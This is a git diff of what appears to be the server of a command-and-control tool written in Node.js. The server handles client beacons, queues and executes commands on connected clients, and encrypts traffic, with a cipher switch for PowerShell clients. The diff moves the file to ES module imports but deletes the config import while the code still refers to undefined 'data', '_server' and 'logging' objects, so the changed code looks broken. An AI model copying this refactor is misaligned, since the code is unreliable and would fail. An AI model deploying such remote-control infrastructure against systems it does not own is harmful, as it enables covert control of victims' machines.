@@ -19,17 +19,15 @@
  *    LICENSE: GPL-3.0
  */
 //  ------------------------------------- VARIABLES -------------------------------------
-const { createServer } = require('node:net');
+import { createServer } from 'node:net';
 
-const { encryptData, decryptData, getSessionId } = require('./utils/encdec');
-const { getUptime, displayCommandOptions, getHowel, getStartup, displayActivePlugins } = require('./utils/helpers');
-const { log, logInfo, logError, logSuccess, createLogStream } = require('./utils/logging');
-const { startInputListener } = require('./utils/readline');
-const { handleResponse, handleBeacon, handleDownloadResponse } = require('./utils/handlers');
-const { setClientActive, showClient, showActiveClients, executeQueuedCommands } = require('./utils/clients');
-const { loadAndRegisterPlugins } = require('./utils/plugins');
-
-const config = require('./config/configLoader');
+import { log, logInfo, logError, logSuccess, createLogStream } from './utils/logging';
+import { getUptime, displayCommandOptions, getHowel, getStartup, displayActivePlugins } from './utils/helpers';
+import { encryptData, decryptData, getSessionId } from './utils/encdec';
+import { startInputListener } from './utils/readline';
+import { handleResponse, handleBeacon, handleDownloadResponse } from './utils/handlers';
+import { setClientActive, showClient, showActiveClients, executeQueuedCommands } from './utils/clients';
+import { loadAndRegisterPlugins } from './utils/plugins';
 
 const activeClients = new Map();
 const queuedCommands = new Map();
@@ -153,6 +151,7 @@ const executeClientCommand = async (client, command) => {
     const socket = client.socket;
     const sessionId = client.sessionId;
     let cipher = 'aes-256-gcm';
+    // powershell needs cbc instead of gcm
     if (client.type === 'ps') {
         cipher = 'aes-256-cbc';
     }
@@ -246,7 +245,7 @@ server = createServer((socket) => {
     }
     socket.on('data', async (payload) => {
         try {
-            if (payload.length >= config.data.chunk_size || payload.includes('--FIN--')) {
+            if (payload.length >= data.chunk_size || payload.includes('--FIN--')) {
                 // chunk mode
                 client.waiting = true;
                 client.buffer += payload;
@@ -303,7 +302,7 @@ server.on('error', (err) => {
     closeServer();
 });
 
-server.listen(config.server.port, config.server.host, async () => {
+server.listen(_server.port, _server.host, async () => {
     // create log
     logStream = await createLogStream();
 
@@ -324,7 +323,7 @@ server.listen(config.server.port, config.server.host, async () => {
                 rl.prompt();
                 return;
             }
-            if (config.logging.enabled && logStream) {
+            if (logging.enabled && logStream) {
                 logStream.write(`Enter command > ${command}\n`);
             }
             // handle the command
